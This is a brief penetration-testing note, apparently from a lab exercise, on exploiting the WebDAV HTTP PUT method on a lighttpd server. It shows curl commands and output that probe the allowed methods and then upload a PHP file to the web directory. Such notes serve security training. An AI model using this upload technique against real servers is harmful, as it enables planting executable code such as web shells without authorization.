## HTTP PUT

the http put method allow to upload a file.

Test : 

```
root@kali:~# curl -vv -X OPTIONS 10.10.10.4/test/
*   Trying 10.10.10.4...
* TCP_NODELAY set
* Connected to 10.10.10.4 (10.10.10.4) port 80 (#0)
> OPTIONS /test/ HTTP/1.1
> Host: 10.10.10.4
> User-Agent: curl/7.62.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Allow: OPTIONS, GET, HEAD, POST
< Content-Length: 0
< Date: Sun, 13 Jan 2019 15:44:29 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 10.10.10.4 left intact
```

```
root@kali:~# curl -T flag.php -H 'Content-Type: application/x-httpd-php' -H 'Expect:' -vv http://10.10.10.4/test/flag.php
*   Trying 10.10.10.4...
* TCP_NODELAY set
* Connected to 10.10.10.4 (10.10.10.4) port 80 (#0)
> PUT /test/flag.php HTTP/1.1
> Host: 10.10.10.4
> User-Agent: curl/7.62.0
> Accept: */*
> Content-Type: application/x-httpd-php
> Content-Length: 26
> 
* We are completely uploaded and fine
< HTTP/1.1 201 Created
< Content-Length: 0
< Date: Sun, 13 Jan 2019 15:49:16 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 10.10.10.4 left intact
```

Note the Expect header, that must be set for lighttpd 1.4.28.

https://stackoverflow.com/questions/49670008/how-to-disable-expect-100-continue-in-libcurl

